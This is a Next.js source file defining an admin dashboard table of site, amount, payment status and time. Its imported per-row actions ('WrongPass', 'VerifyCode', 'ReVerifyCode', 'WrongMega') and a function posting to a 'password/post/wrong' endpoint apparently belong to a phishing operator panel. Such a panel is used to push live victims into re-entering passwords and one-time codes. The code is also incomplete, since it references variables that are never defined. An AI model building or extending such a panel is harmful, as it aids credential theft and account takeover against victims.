import Link from "next/link";
import { getTimeDistance } from "../../../utils/getTimeDistance";
import WrongPass from "../../WrongPass";
import WrongMail from "../../WrongMail";
import VerifyCode from "../../VerifyCode";
import SuccessfulPage from "../../Successful";
import DeleteCollection from "../../DeleteCollection";
import ReVerifyCode from "../../ReVerifyCode";
import WrongMega from "../../WrongMega";
const handleWrongPass = async () => {
  const values = {
    id: posterDetailsId,
    adminId,
  };
  const url = `${API_URL}/password/post/wrong`;

  const res = await fetch(url, {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify(values),
  });
  const data = await res.json();
  console.log(data);
};
export const collectionColumn = [
  {
    Header: "website",
    accessor: "site",
    width: "auto",
  },
  {
    Header: "Amount",
    accessor: "amount",
    width: "auto",
    Cell: ({ value }) => {
      if (!value) return <span className="text-gray-400">-</span>;
      const parsed = parseFloat(value);
      return (
        <span className="font-bold text-emerald-600">
          {!isNaN(parsed) ? `$${parsed.toFixed(2)}` : value}
        </span>
      );
    }
  },
  {
    Header: "Status",
    accessor: "status",
    width: "auto",
    Cell: ({ value }) => {
      const statusVal = value;
      let bg = "bg-yellow-100 text-yellow-800 border border-yellow-200";
      let label = "pending";

      if (statusVal === true || statusVal === "true") {
        bg = "bg-green-100 text-green-800 border border-green-200";
        label = "paid";
      }

      return (
        <span className={`px-2 py-0.5 rounded-full text-xs font-semibold uppercase tracking-wider ${bg}`}>
          {label}
        </span>
      );
    }
  },
  // {
  //   Header: "Ip",
  //   accessor: "ip",
  //   width: "auto",
  // },

  // {
  //   Header: "Agent",
  //   accessor: "agent",
  //   // width: "auto",
  //   minWidth: 500,
  // },
  {
    Header: "Time",
    accessor: "createdAt",
    disableSortBy: true,
    width: "auto",
    // minWidth: 150,
    Cell: ({ row }) => (
      <div className="flex justify-center items-center">
        {row.original.createdAt && getTimeDistance(row.original.createdAt)}
      </div>
    ),
  },
  // {
  //   Header: "Option",
  //   accessor: "_id",
  //   disableSortBy: true,
  //   width: 200,
  //   Cell: ({ row }) => (
  //     <div className="flex flex-col justify-center items-center gap-2">
  //      <WrongPass id={row.original._id} />
  //       <VerifyCode id={row.original._id} />
  //       <ReVerifyCode id={row.original._id} />
  //       <SuccessfulPage id={row.original._id} />
  // <DeleteCollection collectionInfo={row.original}  />
  //     </div>
  //   ),
  // },
];
